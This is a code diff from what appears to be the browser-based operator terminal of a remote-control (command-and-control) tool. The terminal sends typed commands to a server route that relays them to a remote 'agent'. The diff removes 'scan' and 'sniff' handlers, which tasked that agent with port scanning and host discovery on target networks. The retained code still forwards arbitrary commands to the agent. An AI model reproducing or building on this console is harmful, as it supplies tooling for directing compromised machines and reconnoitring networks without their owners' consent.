@@ -210,58 +210,7 @@ class index{
             }
         }
         async get(command){
-            if(command === "--help" && this.uid){
-                const output = document.createElement('div');
-                output.className = 'output';
-                output.contentEditable = true;
-                output.textContent = '--help: View help information\n' +
-                    'scan: scan port(1-65535,scan [IP] [range(1,20,45...)or(1-65534)] [delay])\n' +
-                    'sniff: scan host(sniff [net.range(1,20,45...)or(1-253)] [range(1,20,45...)or(1-65534)] [delay])\n';
-                const inputContainer = terminal.querySelector('.input-container');
-                inputContainer.appendChild(output);
-                this.createInput();
-            } else if (command.startsWith("scan") && this.uid) {
-                this.sendjob('scan...'); // 创建新的提示符
-                (async () => {
-                    let target = command.split(" ")[1];
-                    let port_list = command.split(" ")[2];
-                    let sleep_time = command.split(" ")[3];
-                    let powershell = "GET_PORTS*//*"+target+"*//*"+port_list+"*//*"+sleep_time+"*//*whatever";
-                    let url = this.server+"/`+web_route+`?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell)+"&Taskid="+TaskId;
-                    try {
-                        await fetch(url,{
-                            credentials: 'include' // 发送 cookie
-                        });
-                    } catch (error) {
-                        console.error("Error fetching command:", error);
-                    }
-                })();
-                let flag = await this.lain_time();
-                if (flag) {
-                    this.createInput();
-                }
-            } else if (command.startsWith("sniff") && this.uid) {
-                this.sendjob('sniff...'); // 创建新的提示符
-                (async () => {
-                    let target = command.split(" ")[1];
-                    let sniff_list = command.split(" ")[2];
-                    let sleep_time = command.split(" ")[3];
-                    let powershell = "GET_U_FRIENDS*//*"+target+"*//*"+sniff_list+"*//*"+sleep_time+"*//*whatever";
-                    let url = this.server+"/`+web_route+`?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell)+"&Taskid="+TaskId;
-                    try {
-                        await fetch(url,{
-                            credentials: 'include' // 发送 cookie
-                        });
-                        this.createInput();
-                    } catch (error) {
-                        console.error("Error fetching command:", error);
-                    }
-                })();
-                let flag = await this.lain_time();
-                if (flag) {
-                    this.createInput();
-                }
-            }else if(this.uid){
+            if(this.uid){
                 this.sendjob('agent'); // 创建新的提示符
                 let url = this.server+"/`+web_route+`?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(command)+"&Taskid="+TaskId;
                 await fetch(url,{
